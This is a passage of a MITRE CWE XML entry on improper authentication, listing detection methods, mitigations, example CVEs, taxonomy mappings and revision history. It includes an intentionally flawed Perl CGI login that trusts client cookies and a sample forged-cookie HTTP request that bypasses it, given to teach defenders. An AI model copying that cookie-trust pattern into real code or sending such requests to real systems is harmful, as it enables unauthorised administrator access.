                           <html:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Automated Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Web Application Scanner</html:li>
                           <html:li>Web Services Scanner</html:li>
                           <html:li>Database Scanners</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Manual Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Fuzz Tester</html:li>
                           <html:li>Framework-based Fuzzer</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Manual Source Code Review (not inspections)</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Source code Weakness Analyzer</html:li>
                           <html:li>Context-configured Source Code Weakness Analyzer</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Configuration Checker</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Architecture or Design Review</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</html:li>
                           <html:li>Formal Methods / Correct-By-Construction</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Libraries or Frameworks</ns0:Strategy>
               <ns0:Description>Use an authentication framework or library such as the OWASP ESAPI Authentication feature.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to "remember" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the "Administrator" username, as recorded in the user cookie.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Perl">
                  <html:div>my $q = new CGI;<html:br />
                     <html:br />if ($q-&gt;cookie('loggedin') ne "true") {<html:div style="margin-left:1em;">
                        <html:div>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<html:div style="margin-left:1em;">ExitError("Error: you need to log in first");</html:div>}<html:br />else {<html:div style="margin-left:1em;">
                              <html:div># Set loggedin and user cookies.<html:br />$q-&gt;cookie(<html:div style="margin-left:1em;">-name =&gt; 'loggedin',<html:br />-value =&gt; 'true'<html:br />);</html:div>
                                 <html:br />$q-&gt;cookie(<html:div style="margin-left:1em;">-name =&gt; 'user',<html:br />-value =&gt; $q-&gt;param('username')<html:br />);</html:div>
                              </html:div>
                           </html:div>}</html:div>
                     </html:div>}<html:br />
                     <html:br />if ($q-&gt;cookie('user') eq "Administrator") {<html:div style="margin-left:1em;">DoAdministratorTasks();</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as:</ns0:Body_Text>
               <ns0:Example_Code Nature="Attack">
                  <html:div>GET /cgi-bin/vulnerable.cgi HTTP/1.1<html:br />Cookie: user=Administrator<html:br />Cookie: loggedin=true<html:br />
                     <html:br />[body of request]</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>By setting the loggedin cookie to "true", the attacker bypasses the entire authentication check. By using the "Administrator" value in the user cookie, the attacker also gains privileges to administer the software.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-117">
               <ns0:Intro_Text>In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts [REF-236]. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.</ns0:Intro_Text>
               <ns0:References>
                  <ns0:Reference External_Reference_ID="REF-236" />
               </ns0:References>
            </ns0:Demonstrative_Example>
	    <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <ns0:Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</ns0:Intro_Text>
	      <ns0:Body_Text>Multiple vendors did not use any authentication or used client-side authentication for critical functionality in their OT products.</ns0:Body_Text>
	    </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-36436</ns0:Reference>
               <ns0:Description>Python-based authentication proxy does not enforce password authentication during the initial handshake, allowing the client to bypass authentication by specifying a 'None' authentication type.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-36436</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-30034</ns0:Reference>
               <ns0:Description>Chain: Web UI for a Python RPC framework does not use regex anchors to validate user login emails (CWE-777), potentially allowing bypass of OAuth (CWE-1390).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-30034</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-29951</ns0:Reference>
               <ns0:Description>TCP-based protocol in Programmable Logic Controller (PLC) has no authentication.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-29951</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-29952</ns0:Reference>
               <ns0:Description>Condition Monitor uses a protocol that does not require authentication.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-29952</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-30313</ns0:Reference>
               <ns0:Description>Safety Instrumented System uses proprietary TCP protocols with no authentication.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-30313</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-30317</ns0:Reference>
               <ns0:Description>Distributed Control System (DCS) uses a protocol that has no authentication.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-30317</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-33139</ns0:Reference>
               <ns0:Description>SCADA system only uses client-side authentication, allowing adversaries to impersonate other users.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-33139</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-3116</ns0:Reference>
               <ns0:Description>Chain: Python-based HTTP Proxy server uses the wrong boolean operators (CWE-480) causing an  incorrect comparison (CWE-697) that identifies an authN failure if all three conditions are met instead of only one, allowing bypass of the proxy authentication (CWE-1390)</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-3116</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-21972</ns0:Reference>
               <ns0:Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-37415</ns0:Reference>
               <ns0:Description>IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-37415</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-13927</ns0:Reference>
               <ns0:Description>Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-13927</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-35395</ns0:Reference>
               <ns0:Description>Stack-based buffer overflows in SFK for wifi chipset used for IoT/embedded devices, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-35395</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-34523</ns0:Reference>
               <ns0:Description>Mail server does not properly check an access token before executing a Powershell command, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-34523</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-12812</ns0:Reference>
               <ns0:Description>Chain: user is not prompted for a second authentication factor (CWE-287) when changing the case of their username (CWE-178), as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-12812</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-10148</ns0:Reference>
               <ns0:Description>Authentication bypass by appending specific parameters and values to a URI, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-10148</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-0688</ns0:Reference>
               <ns0:Description>Mail server does not generate a unique key during installation, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-0688</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2017-14623</ns0:Reference>
               <ns0:Description>LDAP Go package allows authentication bypass using an empty password, causing an unauthenticated LDAP bind</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2017-14623</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3421</ns0:Reference>
               <ns0:Description>login script for guestbook allows bypassing authentication by setting a "login_ok" parameter to 1.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3421</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2382</ns0:Reference>
               <ns0:Description>admin script allows authentication bypass by setting a cookie value to "LOGGEDIN".</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2382</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-1048</ns0:Reference>
               <ns0:Description>VOIP product allows authentication bypass using 127.0.0.1 in the Host header.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-1048</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2213</ns0:Reference>
               <ns0:Description>product uses default "Allow" action, instead of default deny, leading to authentication bypass.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2168</ns0:Reference>
               <ns0:Description>chain: redirect without exit (CWE-698) leads to resultant authentication bypass.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2168</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3107</ns0:Reference>
               <ns0:Description>product does not restrict access to a listening port for a critical service, allowing authentication to be bypassed.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3107</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-1596</ns0:Reference>
               <ns0:Description>product does not properly implement a security-related configuration setting, allowing authentication bypass.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-1596</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2422</ns0:Reference>
               <ns0:Description>authentication routine returns "nil" instead of "false" in some situations, allowing authentication bypass using an invalid username.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2422</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3232</ns0:Reference>
               <ns0:Description>authentication update script does not properly handle when admin does not select any authentication modules, allowing authentication bypass.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3232</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3231</ns0:Reference>
               <ns0:Description>use of LDAP authentication with anonymous binds causes empty password to result in successful authentication</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3231</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-3435</ns0:Reference>
               <ns0:Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-3435</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-0408</ns0:Reference>
               <ns0:Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-0408</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Functional_Areas>
            <ns0:Functional_Area>Authentication</ns0:Functional_Area>
         </ns0:Functional_Areas>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <ns0:Entry_Name>Authentication Error</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <ns0:Entry_ID>A7</ns0:Entry_ID>
               <ns0:Entry_Name>Broken Authentication and Session Management</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Specific</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <ns0:Entry_ID>A3</ns0:Entry_ID>
               <ns0:Entry_Name>Broken Authentication and Session Management</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Specific</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>1</ns0:Entry_ID>
               <ns0:Entry_Name>Insufficient Authentication</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
           <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <ns0:Entry_ID>Part 3-3</ns0:Entry_ID>
             <ns0:Entry_Name>Req SR 1.1</ns0:Entry_Name>
           </ns0:Taxonomy_Mapping>
           <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <ns0:Entry_ID>Part 3-3</ns0:Entry_ID>
             <ns0:Entry_Name>Req SR 1.2</ns0:Entry_Name>
           </ns0:Taxonomy_Mapping>
           <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <ns0:Entry_ID>Part 4-2</ns0:Entry_ID>
             <ns0:Entry_Name>Req CR 1.1</ns0:Entry_Name>
           </ns0:Taxonomy_Mapping>
           <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <ns0:Entry_ID>Part 4-2</ns0:Entry_ID>
             <ns0:Entry_Name>Req CR 1.2</ns0:Entry_Name>
           </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="114" />
            <ns0:Related_Attack_Pattern CAPEC_ID="115" />
            <ns0:Related_Attack_Pattern CAPEC_ID="151" />
            <ns0:Related_Attack_Pattern CAPEC_ID="194" />
            <ns0:Related_Attack_Pattern CAPEC_ID="22" />
            <ns0:Related_Attack_Pattern CAPEC_ID="57" />
            <ns0:Related_Attack_Pattern CAPEC_ID="593" />
            <ns0:Related_Attack_Pattern CAPEC_ID="633" />
            <ns0:Related_Attack_Pattern CAPEC_ID="650" />
            <ns0:Related_Attack_Pattern CAPEC_ID="94" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-236" />
            <ns0:Reference External_Reference_ID="REF-237" />
            <ns0:Reference External_Reference_ID="REF-238" />
            <ns0:Reference External_Reference_ID="REF-239" />
            <ns0:Reference External_Reference_ID="REF-7" Section="Chapter 4, &quot;Authentication&quot; Page 109" />
            <ns0:Reference External_Reference_ID="REF-1283" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Discouraged</ns0:Usage>
            <ns0:Rationale>This CWE entry might be misused when lower-level CWE entries are likely to be applicable. It is a level-1 Class (i.e., a child of a Pillar).</ns0:Rationale>
            <ns0:Comments>Consider children or descendants, beginning with CWE-1390: Weak Authentication or CWE-306: Missing Authentication for Critical Function.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Frequent Misuse" />
            </ns0:Reasons>
			<ns0:Suggestions>
			  <ns0:Suggestion CWE_ID="1390" Comment="Weak Authentication" />
			  <ns0:Suggestion CWE_ID="306" Comment="Missing Authentication for Critical Function" />
			</ns0:Suggestions>
         </ns0:Mapping_Notes>
         <ns0:Notes>
            <ns0:Note Type="Relationship">This can be resultant from SQL injection vulnerabilities and other issues.</ns0:Note>
			<ns0:Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>PLOVER</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>Eric Dalci</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Organization>Veracode</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-08-15</ns0:Modification_Date>
               <ns0:Modification_Comment>Suggested OWASP Top Ten 2004 mapping</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Alternate_Terms, Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-10-14</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-01-12</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Name</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-07-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-10-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Observed_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-12-28</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-06-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-03-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2013-07-17</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-02-18</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-06-23</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Detection_Factors, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-19</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-03</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-03-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-09-19</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
